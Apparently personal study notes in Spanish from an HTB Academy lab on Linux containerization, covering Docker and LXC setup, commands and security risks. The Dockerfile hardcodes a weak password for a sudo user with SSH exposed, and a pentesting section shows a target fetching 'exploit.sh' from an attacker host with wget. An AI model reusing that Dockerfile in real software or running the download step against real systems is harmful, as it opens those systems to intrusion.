---
title: "Linux Fundamentals - Containerization"
category: htb
difficulty: easy
tags: [linux, docker, containers, lxc, virtualization]
date: 2026-02-20
status: completed
platform: HTB Academy
module: Linux Fundamentals
section: 23
---

# Linux Fundamentals - Containerization

## Objetivo

Entender los conceptos de containerización en Linux: Docker, LXC, y las diferencias con máquinas virtuales.

---

## Conceptos Clave

### ¿Qué es la Containerización?

La containerización es el proceso de empaquetar y ejecutar aplicaciones en entornos aislados llamados contenedores. Estos proporcionan:

- **Ligereza**: Comparten el kernel del host
- **Consistencia**: Mismo comportamiento en cualquier entorno
- **Aislamiento**: Separación entre aplicaciones
- **Portabilidad**: Fácil movimiento entre sistemas

### Contenedores vs Máquinas Virtuales

| Aspecto | Contenedores | VMs |
|---------|--------------|-----|
| Kernel | Compartido con host | Propio |
| Recursos | Mínimos | Completo OS |
| Inicio | Segundos | Minutos |
| Aislamiento | Namespace/cgroups | Hypervisor |
| Tamaño | MB | GB |

---

## Docker

### Instalación

```bash
#!/bin/bash

# Preparación
sudo apt update -y
sudo apt install ca-certificates curl gnupg lsb-release -y
sudo mkdir -m 0755 -p /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null

# Instalar Docker Engine
sudo apt update -y
sudo apt install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin -y

# Agregar usuario al grupo docker
sudo usermod -aG docker $USER

# Probar instalación
docker run hello-world
```

### Dockerfile Ejemplo

```dockerfile
# Usar Ubuntu 22.04 como base
FROM ubuntu:22.04

# Instalar Apache y SSH
RUN apt-get update && \
    apt-get install -y apache2 openssh-server && \
    rm -rf /var/lib/apt/lists/*

# Crear usuario
RUN useradd -m docker-user && \
    echo "docker-user:password" | chpasswd

# Configurar permisos
RUN chown -R docker-user:docker-user /var/www/html && \
    usermod -aG sudo docker-user

# Exponer puertos
EXPOSE 22 80

# Iniciar servicios
CMD service ssh start && /usr/sbin/apache2ctl -D FOREGROUND
```

### Comandos Docker

```bash
# Construir imagen
docker build -t mi_imagen .

# Ejecutar contenedor
docker run -p 8022:22 -p 8080:80 -d mi_imagen

# Listar contenedores
docker ps

# Detener contenedor
docker stop <container_id>

# Ver logs
docker logs <container_id>

# Eliminar contenedor
docker rm <container_id>

# Eliminar imagen
docker rmi <image_name>
```

### Gestión de Contenedores

| Comando | Descripción |
|---------|-------------|
| `docker ps` | Listar contenedores activos |
| `docker stop` | Detener contenedor |
| `docker start` | Iniciar contenedor detenido |
| `docker restart` | Reiniciar contenedor |
| `docker rm` | Eliminar contenedor |
| `docker rmi` | Eliminar imagen |
| `docker logs` | Ver logs del contenedor |

---

## Linux Containers (LXC)

### Instalación

```bash
sudo apt install lxc -y
```

### Crear Contenedor LXC

```bash
# Crear contenedor Ubuntu
sudo lxc-create -n linuxcontainer -t ubuntu
```

### Comandos LXC

| Comando | Descripción |
|---------|-------------|
| `lxc-ls` | Listar contenedores |
| `lxc-start -n <name>` | Iniciar contenedor |
| `lxc-stop -n <name>` | Detener contenedor |
| `lxc-restart -n <name>` | Reiniciar contenedor |
| `lxc-attach -n <name>` | Conectar al contenedor |
| `lxc-config -n <name> -s storage` | Gestionar storage |
| `lxc-config -n <name> -s network` | Gestionar red |
| `lxc-config -n <name> -s security` | Gestionar seguridad |

### Configurar Recursos (cgroups)

```bash
# Crear archivo de configuración
sudo vim /usr/share/lxc/config/linuxcontainer.conf
```

```
lxc.cgroup.cpu.shares = 512
lxc.cgroup.memory.limit_in_bytes = 512M
```

```bash
# Reiniciar servicio
sudo systemctl restart lxc.service
```

---

## Docker vs LXC

| Aspecto | Docker | LXC |
|---------|--------|-----|
| Enfoque | Aplicación | Sistema |
| Imágenes | Dockerfile estándar | Manual |
| Portabilidad | Alta (Docker Hub) | Menor |
| Facilidad | Simple | Más técnico |
| Seguridad | Más aislado por defecto | Requiere configuración |

---

## Seguridad en Contenedores

### Riesgos

- Escape de contenedor
- Escalada de privilegios
- Acceso al host

### Medidas de Seguridad

1. Restringir acceso al contenedor
2. Limitar recursos (cgroups)
3. Aislar del host
4. Enforce mandatory access control
5. Mantener actualizado

---

## Casos de Uso en Pentesting

### Entorno de Pruebas

```bash
# Crear contenedor vulnerable
docker run -d -p 80:80 vulnerables/web-app
```

### Transferencia de Archivos

```bash
# Servidor de archivos
docker run -p 8080:80 -v /path/to/files:/usr/share/nginx/html nginx

# En target
wget http://atacante:8080/exploit.sh
```

---

## Lecciones Aprendidas

1. **Docker**: Plataforma de containers enfocada en aplicaciones
2. **LXC**: Containers a nivel de sistema, más flexibles
3. **Stateless**: Cambios en contenedor se pierden al detener
4. **Volúmenes**: Para persistir datos
5. **Seguridad**: Contenedores no son VMs, menor aislamiento

---

## Referencias

- [Docker Documentation](https://docs.docker.com/)
- [LXC Documentation](https://linuxcontainers.org/)
- [Docker Hub](https://hub.docker.com/)

---

## Estado

**COMPLETADO** ✓

- Fecha: 2026-02-20
- Módulo: Linux Fundamentals
- Sección: 23 - Containerization
- Tipo: Teoría
